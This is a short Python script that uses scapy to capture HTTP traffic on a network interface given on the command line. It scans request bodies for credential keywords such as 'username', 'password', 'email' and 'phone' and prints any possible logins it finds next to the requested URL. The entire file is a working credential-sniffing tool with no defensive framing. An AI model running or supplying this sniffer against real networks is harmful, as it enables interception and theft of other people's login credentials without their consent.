#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse
import sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface for capture packets.")
    (options, argument) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options

def sniff(interface):
    print("\n\033[0;31;40m[-] Exit from This proocess to Close Terminal\n")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "submit", "password", "pass", "passWord", "userId", "email", "mail", "mobile", "phone"]
        for keyword in keywords:
            if keyword in load.decode():
                return load.decode()

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode()
        #print("\n\033[0;32;40m[+] HTTP Request >> " + url )
	
        login_info = get_login_info(packet)
        if login_info:
            print("\n\033[0;32;40m[+] HTTP Request >> " + url )
            print("\n\n\033[0;33;40m[+] Possible username/password >> " "\033[0;36;40m" + login_info + "\n\n")

options = get_arguments()
sniff(options.interface)

